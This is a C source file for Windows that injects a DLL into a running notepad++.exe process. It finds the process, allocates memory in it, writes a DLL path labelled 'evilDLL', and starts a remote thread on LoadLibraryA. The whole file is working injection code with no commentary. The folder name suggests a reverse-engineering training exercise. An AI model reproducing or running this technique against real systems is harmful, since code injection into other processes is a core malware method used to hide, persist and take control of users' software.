#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[]= "C:\\Users\\84824\\Desktop\\REtrain\\dll injection\\injected.dll";
size_t evilLen = strlen(evilDLL);
DWORD findProcessID(const char* processName)
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return (FALSE);
    }

    do {
        if (!strcmp(pe32.szExeFile, processName)) {
            return pe32.th32ProcessID;
        }

    } while (Process32Next(hProcessSnap, &pe32));

    return 0;
}
int main() {
  const char* processName="notepad++.exe";
  DWORD pid= findProcessID(processName);
  HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
  FARPROC lpLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
  printf("%p ",lpLoadLibrary);
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
  WriteProcessMemory(hProcess, lpBaseAddress, evilDLL, evilLen, NULL);
  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibrary, lpBaseAddress, 0, NULL);
  if(hThread){
  	printf("\nInject successful");
  	CloseHandle(hThread);
  }
  else{
  	printf("\nInject unsuccessful");
  }
  CloseHandle(hProcess);
  return 0;
}
